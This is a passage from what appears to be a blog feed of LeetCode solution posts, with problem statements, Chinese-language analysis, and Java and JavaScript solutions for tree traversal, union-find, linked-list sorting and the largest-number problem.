    <content><![CDATA[<h1 id="Binary-Tree-Zigzag-Level-Order-Traversal"><a href="#Binary-Tree-Zigzag-Level-Order-Traversal" class="headerlink" title="Binary Tree Zigzag Level Order Traversal"></a>Binary Tree Zigzag Level Order Traversal</h1><p>Given a binary tree, return the zigzag level order traversal of its nodes’ values. (ie, from left to right, then right to left for the next level and alternate between).</p>
<p>For example:<br>Given binary tree <code>[3,9,20,null,null,15,7]</code>,</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  3</span><br><span class="line"> &#x2F; \</span><br><span class="line">9  20</span><br><span class="line">  &#x2F;  \</span><br><span class="line"> 15   7</span><br></pre></td></tr></table></figure>
<p>return its zigzag level order traversal as:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [20,9],</span><br><span class="line">  [15,7]</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>以螺旋形层序遍历我们的二叉树。和普通的层序遍历相比，螺旋形只是在原来的基础上增加一个ltr变量，而在我们每次遍历完一层之后，只需要将这个变量取反即可。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * function TreeNode(val) &#123;</span></span><br><span class="line"><span class="comment"> *     this.val = val;</span></span><br><span class="line"><span class="comment"> *     this.left = this.right = null;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;TreeNode&#125;</span> <span class="variable">root</span></span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return <span class="type">&#123;number[][]&#125;</span></span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> zigzagLevelOrder = <span class="function"><span class="keyword">function</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> [];</span><br><span class="line">    <span class="keyword">let</span> res = [];</span><br><span class="line">    <span class="keyword">let</span> ltr = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">let</span> levelResult = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= height(root); i++) &#123;</span><br><span class="line">        traverseGivenLevel(root, i, ltr, levelResult);</span><br><span class="line">        res.push(levelResult);</span><br><span class="line">        ltr = !ltr;</span><br><span class="line">        levelResult = [];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数：给定树根，层，以及遍历方向</span></span><br><span class="line"><span class="comment">// 返回一个遍历后该层的数组</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">traverseGivenLevel</span>(<span class="params">root, i, ltr, levelResult</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">1</span>) &#123;</span><br><span class="line">        levelResult.push(root.val);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(i &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(ltr) &#123;</span><br><span class="line">            traverseGivenLevel(root.left, i - <span class="number">1</span>, ltr, levelResult);</span><br><span class="line">            traverseGivenLevel(root.right, i - <span class="number">1</span>, ltr, levelResult);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            traverseGivenLevel(root.right, i - <span class="number">1</span>, ltr, levelResult);</span><br><span class="line">            traverseGivenLevel(root.left, i - <span class="number">1</span>, ltr, levelResult);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">height</span>(<span class="params">root</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> lheight = height(root.left);</span><br><span class="line">    <span class="keyword">let</span> rheight = height(root.right);</span><br><span class="line">    <span class="keyword">return</span> lheight &gt; rheight ? lheight + <span class="number">1</span> : rheight + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考<a href="https://www.geeksforgeeks.org/level-order-traversal-in-spiral-form/" target="_blank" rel="noopener">https://www.geeksforgeeks.org/level-order-traversal-in-spiral-form/</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>tree</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-130</title>
    <url>/2018/11/14/leetcode-130/</url>
    <content><![CDATA[<h1 id="Surrounded-Regions"><a href="#Surrounded-Regions" class="headerlink" title="Surrounded Regions"></a>Surrounded Regions</h1><p>Given a 2D board containing ‘X’ and ‘O’ (the letter O), capture all regions surrounded by ‘X’.</p>
<p>A region is captured by flipping all ‘O’s into ‘X’s in that surrounded region.</p>
<p><strong>Example:</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X X X X</span><br><span class="line">X O O X</span><br><span class="line">X X O X</span><br><span class="line">X O X X</span><br></pre></td></tr></table></figure>
<p>After running your function, the board should be:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X X X X</span><br><span class="line">X X X X</span><br><span class="line">X X X X</span><br><span class="line">X O X X</span><br></pre></td></tr></table></figure>
<p><strong>Explanation:</strong></p>
<p>Surrounded regions shouldn’t be on the border, which means that any ‘O’ on the border of the board are not flipped to ‘X’. Any ‘O’ that is not on the border and it is not connected to an ‘O’ on the border will be flipped to ‘X’. Two cells are connected if they are adjacent cells connected horizontally or vertically.</p>
<h2 id="分析题意"><a href="#分析题意" class="headerlink" title="分析题意"></a>分析题意</h2><p>这道题的tag是union_find，所以理所应当的想到用union_find的数据结构去理解本题。题意是对于任何在图中非外围的O以及内层与外层O连通的O，将O置换为X。扫描整个二维数组，将外层O连接到一个dummynode，然后对于内层的O，若其上下左右存在O，就连通到其相应的O。如此扫描过后，再遍历二维数组，检查那些不与dummynode连通的O，将其置换为X，问题得解。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rows, cols;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">char</span>[][] board)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (board == <span class="keyword">null</span> || board.length == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        rows = board.length;</span><br><span class="line">        cols = board[<span class="number">0</span>].length;</span><br><span class="line"></span><br><span class="line">        WeightedQuickUnionUF uf = <span class="keyword">new</span> WeightedQuickUnionUF(rows * cols + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> dummyNode = rows * cols;</span><br><span class="line">        <span class="comment">// 扫描二维数组将外层O连接至dummynode，将内层O作相应连接处理</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">'O'</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i == <span class="number">0</span> || i == rows - <span class="number">1</span> || j == <span class="number">0</span> || j == cols - <span class="number">1</span>) &#123;</span><br><span class="line">                        uf.union(node(i, j), dummyNode);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; board[i - <span class="number">1</span>][j] == <span class="string">'O'</span>) uf.union(node(i - <span class="number">1</span>, j), node(i, j));</span><br><span class="line">                        <span class="keyword">if</span> (i &lt; rows - <span class="number">1</span> &amp;&amp; board[i + <span class="number">1</span>][j] == <span class="string">'O'</span>) uf.union(node(i + <span class="number">1</span>, j), node(i, j));</span><br><span class="line">                        <span class="keyword">if</span> (j &gt; <span class="number">0</span> &amp;&amp; board[i][j - <span class="number">1</span>] == <span class="string">'O'</span>) uf.union(node(i, j - <span class="number">1</span>), node(i, j));</span><br><span class="line">                        <span class="keyword">if</span> (j &lt; cols - <span class="number">1</span> &amp;&amp; board[i][j + <span class="number">1</span>] == <span class="string">'O'</span>) uf.union(node(i, j + <span class="number">1</span>), node(i ,j));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 二次遍历该方阵，将未连接至dummynode的O做替换。</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; rows; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cols; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">'O'</span> &amp;&amp; !uf.connected(node(i, j), dummyNode)) &#123;</span><br><span class="line">                    board[i][j] = <span class="string">'X'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">node</span><span class="params">(<span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> i * cols + j;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 带权重的快速联合数据结构</span></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">WeightedQuickUnionUF</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] parent;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span>[] size;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">WeightedQuickUnionUF</span> <span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">            count = n;</span><br><span class="line">            parent = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">            size = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">                parent[i] = i;</span><br><span class="line">                size[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">count</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> count;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> p)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">while</span> (p != parent[p])</span><br><span class="line">                p = parent[p];</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">connected</span> <span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">union</span><span class="params">(<span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">int</span> rootP = find(p);</span><br><span class="line">            <span class="keyword">int</span> rootQ = find(q);</span><br><span class="line">            <span class="keyword">if</span> (rootP == rootQ) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// make smaller root point to larger one</span></span><br><span class="line">            <span class="keyword">if</span> (size[rootP] &lt; size[rootQ]) &#123;</span><br><span class="line">                parent[rootP] = rootQ;</span><br><span class="line">                size[rootQ] += size[rootP];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                parent[rootQ] = rootP;</span><br><span class="line">                size[rootP] += size[rootQ];</span><br><span class="line">            &#125;</span><br><span class="line">            count--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>Union-find</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-147</title>
    <url>/2018/11/16/leetcode-147/</url>
    <content><![CDATA[<h1 id="Insertion-sort-list"><a href="#Insertion-sort-list" class="headerlink" title="Insertion sort list"></a>Insertion sort list</h1><p>Sort a linked list using insertion sort.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: 4-&gt;2-&gt;1-&gt;3</span><br><span class="line">Output: 1-&gt;2-&gt;3-&gt;4</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: -1-&gt;5-&gt;3-&gt;4-&gt;0</span><br><span class="line">Output: -1-&gt;0-&gt;3-&gt;4-&gt;5</span><br></pre></td></tr></table></figure>

<h2 id="分析题意"><a href="#分析题意" class="headerlink" title="分析题意"></a>分析题意</h2><p>相比于原来数组的插入排序而言，该问题困难在对于链表的插入排序，需要利用多个指针保持对链表的访问。思路是：对于basic case，链表为null或只有单个元素，那么链表有序。否则，要先越过链表前部已有序的序列，然后遇到第一个逆序，那么需要利用多个指针将该逆序调整，小数插入到后面合适的位置。而这个合适的位置需要通过从dummyNode向前遍历完成，需要注意的就是前面和后面两个地方的指针修改，谨慎操作。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">insertionSortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode dummyNode = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        dummyNode.next = head;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (head != <span class="keyword">null</span> &amp;&amp; head.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 越过链表前部有序的部分</span></span><br><span class="line">            <span class="keyword">if</span> (head.val &lt;= head.next.val) head = head.next;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 预备插入操作</span></span><br><span class="line">                ListNode temp = head.next;</span><br><span class="line">                head.next = temp.next;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 从dummyNode的下一个开始遍历链表找到第一个大于要插入节点的位置</span></span><br><span class="line">                ListNode cur = dummyNode;</span><br><span class="line">                <span class="keyword">while</span> (cur.next.val &lt;= temp.val) &#123;</span><br><span class="line">                    cur = cur.next;</span><br><span class="line">                &#125;</span><br><span class="line">                temp.next = cur.next;</span><br><span class="line">                cur.next = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-148</title>
    <url>/2018/11/16/leetcode-148/</url>
    <content><![CDATA[<h1 id="Sort-List"><a href="#Sort-List" class="headerlink" title="Sort List"></a>Sort List</h1><p>O(nlog n) time and O(1) space</p>
<h2 id="分析题意"><a href="#分析题意" class="headerlink" title="分析题意"></a>分析题意</h2><p>由于nlogn的时间复杂度，很自然想到归并排序。归并排序可以自顶向下进行归并，也可以自底向上归并。对于数组来说，自顶向下的归并排序时间复杂度nlogn，空间复杂度为n长度的辅助数组和logn深度的递归深度（n+logn），对于自底向上的归并排序，时间复杂度相同，空间复杂度去除了logn的递归深度栈。而对于链表的归并排序，时间复杂度相同，而由于链表不需要额外的辅助数组，所以自顶向下的空间复杂度为logn，自底向上的空间复杂度为O（1）。所以选择自底向上的归并排序。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><ul>
<li>自顶向下的归并排序<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        ListNode slow = head;</span><br><span class="line">        ListNode fast = head.next;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode mid = slow.next;</span><br><span class="line">        slow.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> merge(sortList(head), sortList(mid));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ListNode <span class="title">merge</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode dummyNode = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode tail = dummyNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="keyword">null</span> &amp;&amp; l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (l1.val &gt; l2.val) &#123;</span><br><span class="line">                ListNode temp = l1;</span><br><span class="line">                l1 = l2;</span><br><span class="line">                l2 = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            tail.next = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        tail.next = (l1 == <span class="keyword">null</span>) ? l2 : l1;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>自底向上的归并排序<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (ListNode l = head; l != <span class="keyword">null</span>; l = l.next) length++;</span><br><span class="line"></span><br><span class="line">        ListNode dummyNode = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        dummyNode.next = head;</span><br><span class="line">        ListNode l;</span><br><span class="line">        ListNode r;</span><br><span class="line">        ListNode tail;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> size = <span class="number">1</span>; size &lt; length; size *= <span class="number">2</span>) &#123;</span><br><span class="line">            ListNode cur = dummyNode.next;</span><br><span class="line">            tail = dummyNode;</span><br><span class="line">            <span class="keyword">while</span> (cur != <span class="keyword">null</span>) &#123;</span><br><span class="line">                l = cur;</span><br><span class="line">                r = split(l, size);</span><br><span class="line">                cur = split(r, size);</span><br><span class="line">                Pair p = merge(l, r);</span><br><span class="line">                tail.next = p.first;</span><br><span class="line">                tail = p.second;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyNode.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> ListNode <span class="title">split</span><span class="params">(ListNode head, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (--n &gt; <span class="number">0</span> &amp;&amp; head != <span class="keyword">null</span>) &#123;</span><br><span class="line">            head = head.next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode rest = (head != <span class="keyword">null</span>) ? head.next : <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span> (head != <span class="keyword">null</span>) head.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> rest;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Pair <span class="title">merge</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">        ListNode dummyNode = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        ListNode tail = dummyNode;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="keyword">null</span> &amp;&amp; l2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (l1.val &gt; l2.val) &#123;</span><br><span class="line">                ListNode temp = l1;</span><br><span class="line">                l1 = l2;</span><br><span class="line">                l2 = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            tail.next = l1;</span><br><span class="line">            l1 = l1.next;</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        tail.next = (l1 == <span class="keyword">null</span>) ? l2 : l1;</span><br><span class="line">        <span class="keyword">while</span> (tail.next != <span class="keyword">null</span>) tail = tail.next;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Pair(dummyNode.next, tail);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Pair</span> </span>&#123;</span><br><span class="line">        ListNode first;</span><br><span class="line">        ListNode second;</span><br><span class="line">        Pair(ListNode f, ListNode s) &#123;first = f; second = s;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-179</title>
    <url>/2018/11/17/leetcode-179/</url>
    <content><![CDATA[<h1 id="Largest-Number"><a href="#Largest-Number" class="headerlink" title="Largest Number"></a>Largest Number</h1><p>Given a list of non negative integers, arrange them such that they form the largest number.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [10,2]</span><br><span class="line">Output: &quot;210&quot;</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: [3,30,34,5,9]</span><br><span class="line">Output: &quot;9534330&quot;</span><br></pre></td></tr></table></figure>
<p>Note: The result may be very large, so you need to return a string instead of an integer.</p>
<h2 id="分析题意"><a href="#分析题意" class="headerlink" title="分析题意"></a>分析题意</h2><p>这道题难度不大，主要考察的还是Comparator接口的使用方法。我们需要通过该接口重新定义比较机制。假定数组长度为n的话，数组中平均字符串长为k，比较2个字符串花费O(k)时间，排序花费O(nlogn)，向StringBuilder中追加字符串花费O(n)，所以总花费为O(nklognk) + O(n) = O(nklognk)，空间复杂度O(n)。</p>
<h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">largestNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="string">""</span>;</span><br><span class="line">        String[] s_num = <span class="keyword">new</span> String[nums.length];</span><br><span class="line">        <span class="comment">// Convert num array to string array</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)</span><br><span class="line">            s_num[i] = String.valueOf(nums[i]);</span><br><span class="line">        Comparator&lt;String&gt; cm = <span class="keyword">new</span> Comparator&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(String o1, String o2)</span> </span>&#123;</span><br><span class="line">                String s1 = o1 + o2;</span><br><span class="line">                String s2 = o2 + o1;</span><br><span class="line">                <span class="keyword">return</span> s2.compareTo(s1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        Arrays.sort(s_num, cm);</span><br><span class="line">        <span class="comment">// Extreme case when the nums is all zero</span></span><br><span class="line">        <span class="keyword">if</span>(s_num[<span class="number">0</span>].charAt(<span class="number">0</span>) == <span class="string">'0'</span>) <span class="keyword">return</span> <span class="string">"0"</span>;</span><br><span class="line"></span><br><span class="line">        StringBuilder sb = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(String s : s_num)</span><br><span class="line">            sb.append(s);</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>sort</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode-274</title>
    <url>/2018/11/17/leetcode-274/</url>
    <content><![CDATA[<h1 id="H-Index"><a href="#H-Index" class="headerlink" title="H-Index"></a>H-Index</h1><p>Given an array of citations (each citation is a non-negative integer) of a researcher, write a function to compute the researcher’s h-index.</p>
<p>According to the definition of h-index on Wikipedia: “A scientist has index h if h of his/her N papers have at least h citations each, and the other N − h papers have no more than h citations each.”</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Input: citations &#x3D; [3,0,6,1,5]</span><br><span class="line">Output: 3</span><br><span class="line">Explanation: [3,0,6,1,5] means the researcher has 5 papers in total and each of them had</span><br><span class="line">             received 3, 0, 6, 1, 5 citations respectively.</span><br><span class="line">             Since the researcher has 3 papers with at least 3 citations each and the remaining</span><br><span class="line">             two with no more than 3 citations each, her h-index is 3.</span><br></pre></td></tr></table></figure>
<p>Note: If there are several possible values for h, the maximum one is taken as the h-index.</p>
<h2 id="题意分析"><a href="#题意分析" class="headerlink" title="题意分析"></a>题意分析</h2><p>该题是要从给出的citations数组中分析出一个数字，数组的有大于等于该数字的项数，他们的值大于等于该数字。思路就是构造一个citations出现次数数组，即代码中的aux，我们再从后向前遍历该数组，每次遍历加上citation出现的次数，若某轮出现累计的次数和大于等于循环变量i，那么我们就找到了这个数字。否则不存在这样的数字，返回0。只涉及到数组单层遍历，时间复杂度为O(N)。</p>
